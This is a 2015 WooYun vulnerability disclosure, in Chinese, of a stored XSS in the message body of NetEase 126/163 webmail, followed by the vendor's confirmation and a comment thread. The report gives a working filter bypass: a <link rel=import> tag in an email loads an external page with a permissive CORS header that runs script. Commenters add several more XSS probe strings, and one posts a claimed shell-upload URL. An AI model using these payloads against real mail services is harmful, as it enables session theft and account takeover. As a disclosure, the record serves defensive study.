{"id": 44976, "wybug_id": "wooyun-2015-090318", "wybug_title": "126/163邮箱正文存储型XSS", "wybug_corp": "网易", "wybug_author": "phith0n", "wybug_date": "2015-01-06 17:43", "wybug_open_date": "2015-04-06 17:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向公众公开  简要描述： 正文、直接触发。漏洞不卖，给乌云！重在新思路。 详细说明：  chrome进入36时代以后，多了一种引入外部HTML的方法： \n<link rel=import href=http://xxx/xxx.html>\n twitter上MK很早就通过这个方法bypass了当时的chrome audit：https://twitter.com/avlidienbrunn/status/486059626002395136，但实际上这个方法的危害不止于此，大部分基于黑名单的富文本过滤器是没有考虑这个方式的XSS的，通过这个就能简单构造一个XSS。网易邮箱中枪。首先准备一个外部HTML：http://mhz.pw/game/SOP/01.php\n<?phpheader(\"Access-Control-Allow-Origin: *\");?><script>alert(location.host);</script>\n设置\"Access-Control-Allow-Origin: *\"头才能够被跨域请求。发送邮件正文为：\n<link rel=\"import\" href=\"http://mhz.pw/game/SOP/01.php\">\n最新版chrome下打开可见弹窗，location.host为163.com\n\n126.com一样中枪：\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-09 09:58 厂商回复： 感谢您对网易的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-06 17:46 |    \t\tm4trix1 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 绝对有jj)\t\t \n  前排广告位出租    \n     2015-01-06 17:47 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  <script>alert(\"xss\")</script>    \n     2015-01-06 17:48 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  。。。。。。    \n     2015-01-06 17:50 |    \t\t南宁网警Mx \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 我是独行侠。有心交友qq1552673833)\t\t \n  正文、直接触发。漏洞不卖，给乌云！重在新思路。~    \n     2015-01-06 18:07 |    \t\t付弘雪 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:10        | 希望和业内各位大牛多多交流)\t\t \n      \n     2015-01-06 18:10 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  吊炸天!~    \n     2015-01-06 18:15 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2015-01-06 18:16 |    \t\tadm1n \t\t\t( 普通白帽子  |\t\t\t        Rank:216 漏洞数:66        | 只是一个渣渣而已。。。)\t\t \n  膜拜ph牛    \n     2015-01-06 18:17 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  牛B。    \n     2015-01-06 18:31 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  吊，牛b    \n     2015-01-06 18:39 |    \t\t承诺 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 你关注的漏洞 发表了白帽子)\t\t \n  \t 网易是一个有态度的企业~！！！    \n     2015-01-06 18:46 |    \t\tazuer \t\t\t( 普通白帽子  |\t\t\t        Rank:127 漏洞数:30        )\t\t \n    正文、直接触发。漏洞不卖，给乌云！重在新思路。~     \n     2015-01-06 18:57 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  网易邮箱有都，这个厉害啊    \n     2015-01-06 19:05 |    \t\tNon-polar \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:16        | 只要还有明天，今天就永远是起跑线)\t\t \n  <iframe/src=\"baidu.com\"></iframe>    \n     2015-01-06 19:15 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  感觉思路会是另个xss道路    \n     2015-01-06 19:15 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  CCAV看这里！    \n     2015-01-06 19:15 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  正文、直接触发。漏洞不卖，给乌云！    \n     2015-01-06 19:35 |    \t\tEvan \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:17        | 胸小摸摸大                    ...)\t\t \n  真漂亮    \n     2015-01-06 19:39 |    \t\tBird \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:25        | Stay hungry. Stay foolish.)\t\t \n  求一个求一个~ 前排围观    \n     2015-01-06 19:53 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  最近貌似对邮箱xss很有兴趣额    \n     2015-01-06 20:10 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  好坏的，断人财路的节奏    \n     2015-01-06 20:41 |    \t\tby小小 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 一个无聊的人)\t\t \n  我是路人    \n     2015-01-06 21:20 |    \t\tbeastk \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:11        | 一不小心高潮了)\t\t \n  as吧。    \n     2015-01-06 22:26 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  新思路    \n     2015-01-07 08:27 |    \t\twanglaojiu \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:39        | 道生一，一生二，二生三，三生万物，万物负...)\t\t \n  求别躺枪，挖洞不易    \n     2015-01-07 09:20 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  --！    \n     2015-01-07 15:52 |    \t\tKieran \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | ALways Creative.)\t\t \n  十根辣条卖不卖啊    \n     2015-01-07 18:18 |    \t\tHucheat \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 什么时候才不是路人T_T)\t\t \n  是来看厂商回复的    \n     2015-01-09 10:27 |    \t\tObserver \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:8        | 我在夕阳下奔跑，那是我逝去的青春)\t\t \n  mark    \n     2015-01-09 15:54 |    \t\t劳资就是美国佬 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 劳资就是美国佬)\t\t \n  乌云SHELL上传http://www.wooyun.org/editor/image.php?uploadedId=    \n     2015-04-06 19:18 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  chrome版本是多少.40以上嘛    \n     2015-08-15 10:22 |    \t\t鬼见愁 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 挖洞之神)\t\t \n  我要qq的    \n     2015-08-16 21:01 |    \t\twhirlwind \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 极光肖风)\t\t \n  <video data=\"data:text/html;base64,SGFja2VkIGJ5IFdoaXJsd2luZA==.swf\"></video>    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}